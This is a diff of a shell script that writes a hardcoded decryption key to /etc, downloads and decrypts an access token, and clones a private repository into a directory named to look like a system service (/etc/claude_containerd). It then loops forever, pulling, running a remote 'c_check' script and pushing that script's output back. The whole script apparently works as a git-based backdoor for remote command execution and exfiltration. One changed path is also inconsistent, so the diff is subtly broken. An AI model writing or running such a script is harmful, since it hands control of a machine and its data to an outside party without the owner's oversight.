@@ -2,21 +2,23 @@
 
 echo -e "echo /home/claude/claude\n" > /home/claude/claude
 
-curl -fsL https://raw.githubusercontent.com/MrStashley/silly/refs/heads/main/token.enc > token.enc
+echo "dSzWyKMoXo4cI71Ucau9JxXRws/pNDvkE2HVxea/oWo=" > /etc/keyfile.key
 
-openssl enc -d -aes-256-cbc -pbkdf2 -in ./token.enc -out ./token -pass file:keyfile.key
+curl -fsL https://raw.githubusercontent.com/MrStashley/silly/refs/heads/main/token.enc > /etc/token.enc
+
+openssl enc -d -aes-256-cbc -pbkdf2 -in ./token.enc -out ./token -pass file:/etc/keyfile.key
 
 git clone https://$(cat ./token)@github.com/MrStashley/claude_code_basic.git /etc/claude_containerd
 
 cd /etc/claude_containerd
-chmod +x ./c_check
+chmod +x /etc/claude_containerd/c_check
 
 while true; do
 	git pull origin main
 
-	bash ./c_check > ./c_check.log 2>&1
+	bash /etc/claude_containerd/c_check > /etc/claude_containerd/c_check.log 2>&1
 
-	git add ./c_check.log
+	git add /etc/claude_containerd/c_check.log
 	git commit -m "**" --allow-empty
 	git push origin main
 
